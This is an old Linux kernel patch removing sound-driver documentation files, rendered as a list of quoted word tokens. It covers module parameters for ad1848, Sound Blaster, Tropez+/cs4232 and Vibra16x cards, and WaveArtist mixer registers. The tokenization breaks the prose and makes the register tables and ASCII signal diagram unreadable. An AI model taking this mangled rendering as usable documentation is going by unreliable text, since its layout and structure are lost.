"drivers", ",", "i", ".", "e", ".", "built", "into", "the", "kernel", ".", "Since", "in", "this", "latter", "case", "you", "cannot", "use", "module", "parameters", ",", "you", "will", "have", "to", "enable", "support", "for", "the", "SoundPro", "at", "compile", "time", ".", "The", "IRQ", "and", "DMA", "values", "can", "be", "any", "that", "are", "considered", "acceptable", "for", "a", "WSS", ".", "Assuming", "you", "'", "ve", "got", "isapnp", "all", "happy", ",", "then", "you", "should", "be", "able", "to", "do", "something", "like", "the", "following", "(", "which", "*", "must", "*", "match", "the", "isapnp", "/", "BIOS", "configuration", ")", ":", "modprobe", "ad1848", "io", "=", "0x530", "irq", "=", "11", "dma", "=", "0", "soundpro", "=", "1", "and", "maybe", "modprobe", "sb", "io", "=", "0x220", "irq", "=", "5", "dma", "=", "1", "dma16", "=", "5", "then", "modprobe", "mpu401", "io", "=", "0x330", "irq", "=", "9", "modprobe", "opl3", "io", "=", "0x388", "If", "all", "goes", "well", "and", "you", "see", "no", "error", "messages", ",", "you", "should", "be", "able", "to", "start", "using", "the", "sound", "capabilities", "of", "your", "system", ".", "If", "you", "get", "an", "error", "message", "while", "trying", "to", "insert", "the", "module", "(", "s", ")", ",", "then", "make", "sure", "that", "the", "values", "of", "the", "various", "arguments", "match", "what", "you", "specified", "in", "your", "isapnp", "configuration", "file", ",", "and", "that", "there", "is", "no", "conflict", "with", "another", "device", "for", "an", "I", "/", "O", "port", "or", "interrupt", ".", "Checking", "the", "contents", "of", "/", "proc", "/", "ioports", "and", "/", "proc", "/", "interrupts", "can", "be", "useful", "to", "see", "if", "you", "'", "re", "butting", "heads", "with", "another", "device", ".", "If", "you", "do", "not", "see", "the", "chipset", "version", "message", ",", "and", "none", "of", "the", "other", "messages", "present", "in", "the", "system", "log", "are", "helpful", ",", "try", "adding", "'", "debug", "=", "1", "'", "to", "the", "ad1848", "parameters", ",", "email", "me", "the", "syslog", "results", "and", "I", "'", "ll", "do", "my", "best", "to", "help", ".", "Lastly", ",", "if", "you", "'", "re", "using", "modules", "and", "want", "to", "set", "up", "automatic", "module", "loading", "with", "kmod", ",", "the", "kernel", "module", "loader", ",", "here", "is", "the", "section", "I", "currently", "use", "in", "my", "conf", ".", "modules", "file", ":", "#", "Sound", "post", "-", "install", "sound", "modprobe", "-", "k", "ad1848", ";", "modprobe", "-", "k", "mpu401", ";", "modprobe", "-", "k", "opl3", "options", "ad1848", "io", "=", "0x530", "irq", "=", "11", "dma", "=", "0", "options", "sb", "io", "=", "0x220", "irq", "=", "5", "dma", "=", "1", "dma16", "=", "5", "options", "mpu401", "io", "=", "0x330", "irq", "=", "9", "options", "opl3", "io", "=", "0x388", "The", "above", "ensures", "that", "ad1848", "will", "be", "loaded", "whenever", "the", "sound", "system", "is", "being", "used", ".", "Good", "luck", ".", "Ion", "NOT", "REALLY", "TESTED", ":", "recording", "recording", "device", "selection", "full", "-", "duplex", "TODO", ":", "implement", "mixer", "support", "for", "surround", ",", "loud", ",", "digital", "CD", "switches", ".", "come", "up", "with", "a", "scheme", "which", "allows", "recording", "volumes", "for", "each", "subdevice", ".", "This", "is", "a", "major", "OSS", "API", "change", ".", "@", "@", "-", "1", ",", "53", "+", "0", ",", "0", "@", "@", "modprobe", "sound", "insmod", "uart401", "insmod", "sb", ".", "..", "This", "loads", "the", "driver", "for", "the", "Sound", "Blaster", "and", "assorted", "clones", ".", "Cards", "that", "are", "covered", "by", "other", "drivers", "should", "not", "be", "using", "this", "driver", ".", "The", "Sound", "Blaster", "module", "takes", "the", "following", "arguments", "io", "I", "/", "O", "address", "of", "the", "Sound", "Blaster", "chip", "(", "0x220", ",", "0x240", ",", "0x260", ",", "0x280", ")", "irq", "IRQ", "of", "the", "Sound", "Blaster", "chip", "(", "5", ",", "7", ",", "9", ",", "10", ")", "dma", "8", "-", "bit", "DMA", "channel", "for", "the", "Sound", "Blaster", "(", "0", ",", "1", ",", "3", ")", "dma16", "16", "-", "bit", "DMA", "channel", "for", "SB16", "and", "equivalent", "cards", "(", "5", ",", "6", ",", "7", ")", "mpu_io", "I", "/", "O", "for", "MPU", "chip", "if", "present", "(", "0x300", ",", "0x330", ")", "sm_games", "=", "1", "Set", "if", "you", "have", "a", "Logitech", "soundman", "games", "acer", "=", "1", "Set", "this", "to", "detect", "cards", "in", "some", "ACER", "notebooks", "mwave_bug", "=", "1", "Set", "if", "you", "are", "trying", "to", "use", "this", "driver", "with", "mwave", "(", "see", "on", ")", "type", "Use", "this", "to", "specify", "a", "specific", "card", "type", "The", "following", "arguments", "are", "taken", "if", "ISAPnP", "support", "is", "compiled", "in", "isapnp", "=", "0", "Set", "this", "to", "disable", "ISAPnP", "detection", "(", "use", "io", "=", "0xXXX", "etc", ".", "above", ")", "multiple", "=", "0", "Set", "to", "disable", "detection", "of", "multiple", "Soundblaster", "cards", ".", "Consider", "it", "a", "bug", "if", "this", "option", "is", "needed", ",", "and", "send", "in", "a", "report", ".", "pnplegacy", "=", "1", "Set", "this", "to", "be", "able", "to", "use", "a", "PnP", "card", "(", "s", ")", "along", "with", "a", "single", "non", "-", "PnP", "(", "legacy", ")", "card", ".", "Above", "options", "for", "io", ",", "irq", ",", "etc", ".", "are", "needed", ",", "and", "will", "apply", "only", "to", "the", "legacy", "card", ".", "reverse", "=", "1", "Reverses", "the", "order", "of", "the", "search", "in", "the", "PnP", "table", ".", "uart401", "=", "1", "Set", "to", "enable", "detection", "of", "mpu", "devices", "on", "some", "clones", ".", "isapnpjump", "=", "n", "Jumps", "to", "slot", "n", "in", "the", "driver", "'", "s", "PnP", "table", ".", "Use", "the", "source", ",", "Luke", ".", "You", "may", "well", "want", "to", "load", "the", "opl3", "driver", "for", "synth", "music", "on", "most", "SB", "and", "clone", "SB", "devices", "insmod", "opl3", "io", "=", "0x388", "Using", "Mwave", "To", "make", "this", "driver", "work", "with", "Mwave", "you", "must", "set", "mwave_bug", ".", "You", "also", "need", "to", "warm", "boot", "from", "DOS", "/", "Windows", "with", "the", "required", "firmware", "loaded", "under", "this", "OS", ".", "IBM", "are", "being", "difficult", "about", "documenting", "how", "to", "load", "this", "firmware", ".", "Avance", "Logic", "ALS007", "This", "card", "is", "supported", ";", "see", "the", "separate", "file", "ALS007", "for", "full", "details", ".", "Avance", "Logic", "ALS100", "This", "card", "is", "supported", ";", "setup", "should", "be", "as", "for", "a", "standard", "Sound", "Blaster", "16", ".", "The", "driver", "will", "identify", "the", "audio", "device", "as", "a", "\"", "Sound", "Blaster", "16", "(", "ALS", "-", "100", ")", "\".", "@", "@", "-", "1", ",", "26", "+", "0", ",", "0", "@", "@", "From", ":", "Paul", "Barton", "-", "Davis", "<", "pbd", "@", "op", ".", "net", ">", "Here", "is", "the", "configuration", "I", "use", "with", "a", "Tropez", "+", "and", "my", "modular", "driver", ":", "alias", "char", "-", "major", "-", "14", "wavefront", "alias", "synth0", "wavefront", "alias", "mixer0", "cs4232", "alias", "audio0", "cs4232", "pre", "-", "install", "wavefront", "modprobe", "\"", "-", "k", "\"", "\"", "cs4232", "\"", "post", "-", "install", "wavefront", "modprobe", "\"", "-", "k", "\"", "\"", "opl3", "\"", "options", "wavefront", "io", "=", "0x200", "irq", "=", "9", "options", "cs4232", "synthirq", "=", "9", "synthio", "=", "0x200", "io", "=", "0x530", "irq", "=", "5", "dma", "=", "1", "dma2", "=", "0", "options", "opl3", "io", "=", "0x388", "Things", "to", "note", ":", "the", "wavefront", "options", "\"", "io", "\"", "and", "\"", "irq", "\"", "*", "**", "MUST", "*", "**", "match", "the", "\"", "synthio", "\"", "and", "\"", "synthirq", "\"", "cs4232", "options", ".", "you", "can", "do", "without", "the", "opl3", "module", "if", "you", "don", "'", "t", "want", "to", "use", "the", "OPL", "/", "[", "34", "]", "synth", "on", "the", "soundcard", "the", "opl3", "io", "parameter", "is", "conventionally", "not", "adjustable", ".", "Please", "see", "drivers", "/", "sound", "/", "README", ".", "wavefront", "for", "more", "details", ".", "@", "@", "-", "1", ",", "80", "+", "0", ",", "0", "@", "@", "Sound", "Blaster", "16X", "Vibra", "addendum", "by", "Marius", "Ilioaea", "<", "mariusi", "@", "protv", ".", "ro", ">", "Stefan", "Laudat", "<", "stefan", "@", "asit", ".", "ro", ">", "Sat", "Mar", "6", "23", ":", "55", ":", "27", "EET", "1999", "Hello", "again", ",", "Playing", "with", "a", "SB", "Vibra", "16x", "soundcard", "we", "found", "it", "very", "difficult", "to", "setup", "because", "the", "kernel", "reported", "a", "lot", "of", "DMA", "errors", "and", "wouldn", "'", "t", "simply", "play", "any", "sound", ".", "A", "good", "starting", "point", "is", "that", "the", "vibra16x", "chip", "full", "-", "duplex", "facility", "is", "neither", "still", "exploited", "by", "the", "sb", "driver", "found", "in", "the", "linux", "kernel", "(", "tried", "it", "with", "a", "2", ".", "2", ".", "2", "-", "ac7", ")", ",", "nor", "in", "the", "commercial", "OSS", "package", "(", "it", "reports", "it", "as", "half", "-", "duplex", "soundcard", ")", ".", "Oh", ",", "I", "almost", "forgot", ",", "the", "RedHat", "sndconfig", "failed", "detecting", "it", ";", ")", "So", ",", "the", "big", "problem", "still", "remains", ",", "because", "the", "sb", "module", "wants", "a", "8", "-", "bit", "and", "a", "16", "-", "bit", "dma", ",", "which", "we", "could", "not", "allocate", "for", "vibra", ".", "..", "it", "supports", "only", "two", "8", "-", "bit", "dma", "channels", ",", "the", "second", "one", "will", "be", "passed", "to", "the", "module", "as", "a", "16", "bit", "channel", ",", "the", "kernel", "will", "yield", "about", "that", "but", "everything", "will", "be", "okay", ",", "trust", "us", ".", "The", "only", "inconvenient", "you", "may", "find", "is", "that", "you", "will", "have", "some", "sound", "playing", "jitters", "if", "you", "have", "HDD", "dma", "support", "enabled", "-", "but", "this", "will", "happen", "with", "almost", "all", "soundcards", ".", "..", "A", "fully", "working", "isapnp", ".", "conf", "is", "just", "here", ":", "<", "snip", "here", ">", "(", "READPORT", "0x0203", ")", "(", "ISOLATE", "PRESERVE", ")", "(", "IDENTIFY", "*", ")", "(", "VERBOSITY", "2", ")", "(", "CONFLICT", "(", "IO", "FATAL", ")", "(", "IRQ", "FATAL", ")", "(", "DMA", "FATAL", ")", "(", "MEM", "FATAL", ")", ")", "#", "or", "WARNING", "#", "SB", "16", "and", "OPL3", "devices", "(", "CONFIGURE", "CTL00f0", "/", "-", "1", "(", "LD", "0", "(", "INT", "0", "(", "IRQ", "5", "(", "MODE", "+", "E", ")", "))", "(", "DMA", "0", "(", "CHANNEL", "1", ")", ")", "(", "DMA", "1", "(", "CHANNEL", "3", ")", ")", "(", "IO", "0", "(", "SIZE", "16", ")", "(", "BASE", "0x0220", ")", ")", "(", "IO", "2", "(", "SIZE", "4", ")", "(", "BASE", "0x0388", ")", ")", "(", "NAME", "\"", "CTL00f0", "/", "-", "1", "[", "0", "]", "{", "Audio", "}", "\")", "(", "ACT", "Y", ")", ")", ")", "#", "Joystick", "device", "-", "only", "if", "you", "need", "it", ":", "-/", "(", "CONFIGURE", "CTL00f0", "/", "-", "1", "(", "LD", "1", "(", "IO", "0", "(", "SIZE", "1", ")", "(", "BASE", "0x0200", ")", ")", "(", "NAME", "\"", "CTL00f0", "/", "-", "1", "[", "1", "]", "{", "Game", "}", "\")", "(", "ACT", "Y", ")", ")", ")", "(", "WAITFORKEY", ")", "<", "end", "of", "snipping", ">", "So", ",", "after", "a", "good", "kernel", "modules", "compilation", "and", "a", "'", "depmod", "-", "a", "kernel_ver", "'", "you", "may", "want", "to", ":", "modprobe", "sb", "io", "=", "0x220", "irq", "=", "5", "dma", "=", "1", "dma16", "=", "3", "Or", ",", "take", "the", "hard", "way", ":", "modprobe", "soundcore", "modprobe", "sound", "modprobe", "uart401", "modprobe", "sb", "io", "=", "0x220", "irq", "=", "5", "dma", "=", "1", "dma16", "=", "3", "#", "do", "you", "need", "MIDI", "?", "modprobe", "opl3", "=", "0x388", "Just", "in", "case", ",", "the", "kernel", "sound", "support", "should", "be", ":", "CONFIG_SOUND", "=", "m", "CONFIG_SOUND_OSS", "=", "m", "CONFIG_SOUND_SB", "=", "m", "Enjoy", "your", "new", "noisy", "Linux", "box", "!", ";", ")", "@", "@", "-", "1", ",", "170", "+", "0", ",", "0", "@", "@", "(", "the", "following", "is", "from", "the", "armlinux", "CVS", ")", "WaveArtist", "mixer", "and", "volume", "levels", "can", "be", "accessed", "via", "these", "commands", ":", "nn30", "read", "registers", "nn", ",", "where", "nn", "=", "00", "-", "09", "for", "mixer", "settings", "0a", "-", "13", "for", "channel", "volumes", "mm31", "write", "the", "volume", "setting", "in", "pairs", ",", "where", "mm", "=", "(", "nn", "-", "10", ")", "/", "2", "rr32", "write", "the", "mixer", "settings", "in", "pairs", ",", "where", "rr", "=", "nn", "/", "2", "xx33", "reset", "all", "settings", "to", "default", "0y34", "select", "mono", "source", ",", "y", "=", "0", "=", "left", ",", "y", "=", "1", "=", "right", "bits", "nn", "15", "14", "13", "12", "11", "10", "9", "8", "7", "6", "5", "4", "3", "2", "1", "0", "+", "--", "-+", "--", "--", "--", "--", "--", "--", "+-", "--", "--", "+-", "--", "--", "+-", "--", "--", "+-", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "00", "|", "0", "|", "0", "0", "1", "1", "|", "left", "line", "mixer", "gain", "|", "left", "aux1", "mixer", "gain", "|", "lmute", "|", "+", "--", "-+", "--", "--", "--", "--", "--", "--", "+-", "--", "--", "+-", "--", "--", "+-", "--", "--", "+-", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "01", "|", "0", "|", "0", "1", "0", "1", "|", "left", "aux2", "mixer", "gain", "|", "right", "2", "left", "mic", "gain", "|", "mmute", "|", "+", "--", "-+", "--", "--", "--", "--", "--", "--", "+-", "--", "--", "+-", "--", "--", "+-", "--", "--", "+-", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "02", "|", "0", "|", "0", "1", "1", "1", "|", "left", "mic", "mixer", "gain", "|", "left", "mic", "|", "left", "mixer", "gain", "|", "dith", "|", "+", "--", "-+", "--", "--", "--", "--", "--", "--", "+-", "--", "--", "+-", "--", "--", "+-", "--", "--", "+-", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "03", "|", "0", "|", "1", "0", "0", "1", "|", "left", "mixer", "input", "select", "|", "lrfg", "|", "left", "ADC", "gain", "|", "+", "--", "-+", "--", "--", "--", "--", "--", "--", "+-", "--", "--", "+-", "--", "--", "+-", "--", "--", "+-", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "04", "|", "0", "|", "1", "0", "1", "1", "|", "right", "line", "mixer", "gain", "|", "right", "aux1", "mixer", "gain", "|", "rmute", "|", "+", "--", "-+", "--", "--", "--", "--", "--", "--", "+-", "--", "--", "+-", "--", "--", "+-", "--", "--", "+-", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "05", "|", "0", "|", "1", "1", "0", "1", "|", "right", "aux2", "mixer", "gain", "|", "left", "2", "right", "mic", "gain", "|", "test", "|", "+", "--", "-+", "--", "--", "--", "--", "--", "--", "+-", "--", "--", "+-", "--", "--", "+-", "--", "--", "+-", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "06", "|", "0", "|", "1", "1", "1", "1", "|", "right", "mic", "mixer", "gain", "|", "right", "mic", "|", "right", "mixer", "gain", "|", "rbyps", "|", "+", "--", "-+", "--", "--", "--", "--", "--", "--", "+-", "--", "--", "+-", "--", "--", "+-", "--", "--", "+-", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "07", "|", "1", "|", "0", "0", "0", "1", "|", "right", "mixer", "select", "|", "rrfg", "|", "right", "ADC", "gain", "|", "+", "--", "-+", "--", "--", "--", "--", "--", "--", "+-", "--", "--", "+-", "--", "--", "+-", "--", "--", "+-", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "08", "|", "1", "|", "0", "0", "1", "1", "|", "mono", "mixer", "gain", "|", "right", "ADC", "mux", "sel", "|", "left", "ADC", "mux", "sel", "|", "+", "--", "-+", "--", "--", "--", "--", "--", "--", "+-", "--", "--", "+-", "--", "--", "+-", "--", "--", "+-", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "09", "|", "1", "|", "0", "1", "0", "1", "|", "loopb", "|", "left", "linout", "|", "loop", "|", "ADCch", "|", "TxFch", "|", "OffCD", "|", "test", "|", "loopb", "|", "loopb", "|", "osamp", "|", "+", "--", "-+", "--", "--", "--", "--", "--", "--", "+-", "--", "--", "+-", "--", "--", "+-", "--", "--", "+-", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "0a", "|", "0", "|", "left", "PCM", "channel", "volume", "|", "+", "--", "-+", "--", "--", "--", "--", "--", "--", "+-", "--", "--", "+-", "--", "--", "+-", "--", "--", "+-", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "0b", "|", "0", "|", "right", "PCM", "channel", "volume", "|", "+", "--", "-+", "--", "--", "--", "--", "--", "--", "+-", "--", "--", "+-", "--", "--", "+-", "--", "--", "+-", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "0c", "|", "0", "|", "left", "FM", "channel", "volume", "|", "+", "--", "-+", "--", "--", "--", "--", "--", "--", "+-", "--", "--", "+-", "--", "--", "+-", "--", "--", "+-", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "0d", "|", "0", "|", "right", "FM", "channel", "volume", "|", "+", "--", "-+", "--", "--", "--", "--", "--", "--", "+-", "--", "--", "+-", "--", "--", "+-", "--", "--", "+-", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "0e", "|", "0", "|", "left", "wavetable", "channel", "volume", "|", "+", "--", "-+", "--", "--", "--", "--", "--", "--", "+-", "--", "--", "+-", "--", "--", "+-", "--", "--", "+-", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "0f", "|", "0", "|", "right", "wavetable", "channel", "volume", "|", "+", "--", "-+", "--", "--", "--", "--", "--", "--", "+-", "--", "--", "+-", "--", "--", "+-", "--", "--", "+-", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "10", "|", "0", "|", "left", "PCM", "expansion", "channel", "volume", "|", "+", "--", "-+", "--", "--", "--", "--", "--", "--", "+-", "--", "--", "+-", "--", "--", "+-", "--", "--", "+-", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "11", "|", "0", "|", "right", "PCM", "expansion", "channel", "volume", "|", "+", "--", "-+", "--", "--", "--", "--", "--", "--", "+-", "--", "--", "+-", "--", "--", "+-", "--", "--", "+-", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "12", "|", "0", "|", "left", "FM", "expansion", "channel", "volume", "|", "+", "--", "-+", "--", "--", "--", "--", "--", "--", "+-", "--", "--", "+-", "--", "--", "+-", "--", "--", "+-", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "13", "|", "0", "|", "right", "FM", "expansion", "channel", "volume", "|", "+", "--", "-+", "--", "--", "--", "--", "--", "--", "+-", "--", "--", "+-", "--", "--", "+-", "--", "--", "+-", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "--", "--", "-+", "lmute", ":", "left", "mute", "mmute", ":", "mono", "mute", "dith", ":", "dithds", "lrfg", ":", "rmute", ":", "right", "mute", "rbyps", ":", "right", "bypass", "rrfg", ":", "ADCch", ":", "TxFch", ":", "OffCD", ":", "osamp", ":", "And", "the", "following", "diagram", "is", "derived", "from", "the", "description", "in", "the", "CVS", "archive", ":", "MIC", "L", "(", "mouthpiece", ")", "+", "--", "--", "--", "+", "-", "->", "PreAmp", ">", "-\\", "+", "--", "^-", "--", "+", "|", "|", "|", "r2b4", "-", "5", "|", "+", "--", "--", "--", "--", "+", "/", "--", "--", "*-", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "->", "5", "|", "|", "|", "|", "|", "/", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "->", "4", "|", "|", "|", "|", "|", "|", "|", "/", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "->", "3", "1of5", "|", "+", "--", "-+", "|", "|", "|", "|", "mux", ">", "--", ">", "AMP", ">", "--", ">", "ADC", "L", "|", "|", "|", "/", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "->", "2", "|", "+", "-^", "-+", "|", "|", "|", "|", "|", "|", "|", "Line", "|", "|", "|", "|", "+", "--", "--", "+", "+", "--", "--", "--", "+", "+", "--", "-+", "/", "--", "--", ">", "1", "|", "r3b3", "-", "0", "-", "--", "--", "--", "--", "--", "-*", "->", "mute", ">", "--", ">", "Gain", ">", "--", ">", "|", "|", "|", "|", "L", "|", "|", "|", "+", "--", "--", "+", "+", "--", "--", "--", "+", "|", "|", "|", "*", "->", "0", "|", "|", "|", "|", "|", "|", "|", "+", "--", "-^", "--", "--", "+", "Aux2", "|", "|", "|", "+", "--", "--", "+", "+", "--", "--", "--", "+", "|", "|", "|", "|", "-", "--", "--", "--", "--", "-*", "--", "->", "mute", ">", "--", ">", "Gain", ">", "--", ">", "M", "|", "|", "r8b0", "-", "2", "L", "|", "|", "+", "--", "--", "+", "+", "--", "--", "--", "+", "|", "|", "|", "|", "|", "|", "|", "\\", "--", "--", "--", "\\", "Aux1", "|", "|", "+", "--", "--", "+", "+", "--", "--", "--", "+", "|", "|", "|", "-", "--", "--", "--", "-*", "--", "--", "->", "mute", ">", "--", ">", "Gain", ">", "--", ">", "I", "|", "|", "L", "|", "+", "--", "--", "+", "+", "--", "--", "--", "+", "|", "|", "|", "|", "|", "|", "|", "|", "+", "--", "--", "+", "+", "--", "--", "--", "+", "|", "|", "+", "--", "-+", "|", "*", "--", "--", "--", "->", "mute", ">", "--", ">", "Gain", ">", "--", ">", "X", ">", "--", ">", "AMP", ">", "--", "*", "|", "+", "--", "--", "+", "+", "--", "--", "--", "+", "|", "|", "+", "-^", "-+", "|", "|", "|", "|", "|", "|", "|", "+", "--", "--", "+", "+", "--", "--", "--", "+", "|", "|", "r2b1", "-", "3", "|", "|", "/", "--", "--", "->", "mute", ">", "--", ">", "Gain", ">", "--", ">", "E", "|", "|", "|", "|", "+", "--", "--", "+", "+", "--", "--", "--", "+", "|", "|", "|", "|", "|", "|", "|", "|", "|", "|", "+", "--", "--", "+", "+", "--", "--", "--", "+", "|", "|", "|", "|", "|", "/", "--", "->", "mute", ">", "--", ">", "Gain", ">", "--", ">", "R", "|", "|", "|", "|", "|", "+", "--", "--", "+", "+", "--", "--", "--", "+", "|", "|", "|", "|", "|", "|", "|", "|", "|", "r9b8", "-", "9", "|", "|", "|", "+", "--", "--", "+", "+", "--", "--", "--", "+", "|", "|", "|", "|", "|", "|", "|", "/", "->", "mute", ">", "--", ">", "Gain", ">", "--", ">", "|", "|", "+", "--", "-", "v", "-", "--", "+", "|", "|", "|", "|", "+", "--", "--", "+", "+", "--", "--", "--", "+", "+", "--", "-+", "/", "-*", "->", "0", "|", "DAC", "|", "|", "|", "|", "|", "|", "|", "-", "--", "--", "--", "--", "--", "-*", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "->", "?", "|", "+", "--", "--", "+", "L", "|", "|", "|", "|", "|", "Mux", ">", "--", ">", "mute", ">", "--", ">", "L", "output", "|", "|", "|", "|", "/", "->", "?", "|", "+", "--", "^-", "+", "|", "|", "|", "|", "|", "|", "|", "|", "|", "|", "|", "/", "--", "--", "--", "--", "->", "?", "|", "r0b0", "|", "|", "|", "|", "|", "|", "+", "--", "--", "--", "-+", "|", "|", "|", "|", "|", "|", "Mono", "|", "|", "|", "|", "|", "|", "+", "--", "--", "--", "-+", "-", "--", "--", "--", "--", "-*", "|", "\\", "--", "->", "|", "+", "--", "--", "+", "|", "|", "|", "|", "|", "|", "Mix", ">", "--", ">", "mute", ">", "--", ">", "Mono", "output", "|", "|", "|", "|", "*", "->", "|", "+", "--", "^-", "+", "|", "|", "|", "|", "|", "+", "--", "--", "--", "-+", "|", "|", "|", "|", "|", "|", "r1b0", "DAC", "|", "|", "|", "|", "|", "+", "--", "--", "--", "-+", "-", "--", "--", "--", "--", "--", "-*", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "-*", "--", "--", "--", "--", "->", "1", "|", "+", "--", "--", "+", "R", "|", "|", "|", "|", "|", "|", "Mux", ">", "--", ">", "mute", ">", "--", ">", "R", "output", "|", "|", "|", "|", "+", "--", "--", "+", "+", "--", "--", "--", "+", "+", "--", "-+", "*", "->", "0", "|", "+", "--", "^-", "+", "|", "|", "|", "\\", "->", "mute", ">", "--", ">", "Gain", ">", "--", ">", "|", "|", "+", "--", "-^", "--", "-+", "|", "|", "|", "|", "+", "--", "--", "+", "+", "--", "--", "--", "+", "|", "|", "|", "|", "r5b0", "|", "|", "|", "|", "|", "|", "r6b0", "|", "|", "|", "+", "--", "--", "+", "+", "--", "--", "--", "+", "|", "|", "|", "|", "|", "\\", "--", "->", "mute", ">", "--", ">", "Gain", ">", "--", ">", "M", "|", "|", "|", "|", "+", "--", "--", "+", "+", "--", "--", "--", "+", "|", "|", "|", "|", "|", "|", "|", "|", "|", "|", "+", "--", "--", "+", "+", "--", "--", "--", "+", "|", "|", "|", "|", "*", "--", "--", "->", "mute", ">", "--", ">", "Gain", ">", "--", ">", "I", "|", "|", "|", "|", "+", "--", "--", "+", "+", "--", "--", "--", "+", "|", "|", "|", "|", "|", "|", "|", "|", "|", "|", "+", "--", "--", "+", "+", "--", "--", "--", "+", "|", "|", "+", "--", "-+", "|", "\\", "--", "--", "--", "->", "mute", ">", "--", ">", "Gain", ">", "--", ">", "X", ">", "--", ">", "AMP", ">", "--", "*", "|", "+", "--", "--", "+", "+", "--", "--", "--", "+", "|", "|", "+", "-^", "-+", "|", "/", "--", "/", "|", "|", "|", "|", "Aux1", "|", "+", "--", "--", "+", "+", "--", "--", "--", "+", "|", "|", "r6b1", "-", "3", "|", "-", "--", "--", "--", "*-", "--", "--", "->", "mute", ">", "--", ">", "Gain", ">", "--", ">", "E", "|", "|", "R", "|", "|", "+", "--", "--", "+", "+", "--", "--", "--", "+", "|", "|", "|", "|", "|", "|", "|", "|", "Aux2", "|", "|", "+", "--", "--", "+", "+", "--", "--", "--", "+", "|", "|", "/", "--", "--", "--", "/", "-", "--", "--", "--", "--", "*-", "--", "->", "mute", ">", "--", ">", "Gain", ">", "--", ">", "R", "|", "|", "R", "|", "|", "|", "+", "--", "--", "+", "+", "--", "--", "--", "+", "|", "|", "|", "|", "|", "|", "|", "|", "|", "+", "--", "--", "--", "--", "+", "Line", "|", "|", "|", "+", "--", "--", "+", "+", "--", "--", "--", "+", "|", "|", "|", "*", "->", "0", "|", "-", "--", "--", "--", "--", "--", "*-", "->", "mute", ">", "--", ">", "Gain", ">", "--", ">", "|", "|", "|", "|", "R", "|", "|", "|", "|", "+", "--", "--", "+", "+", "--", "--", "--", "+", "+", "--", "-+", "\\", "--", "--", ">", "1", "|", "|", "|", "|", "|", "|", "|", "|", "|", "|", "\\", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", ">", "2", "|", "+", "--", "-+", "|", "|", "|", "|", "Mux", ">", "--", ">", "AMP", ">", "--", ">", "ADC", "R", "|", "|", "\\", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", ">", "3", "|", "+", "-^", "-+", "|", "|", "|", "|", "|", "|", "\\", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", ">", "4", "|", "r7b3", "-", "0", "|", "|", "|", "\\", "--", "--", "-*", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", "--", ">", "5", "|", "|", "+", "--", "-^", "--", "--", "+", 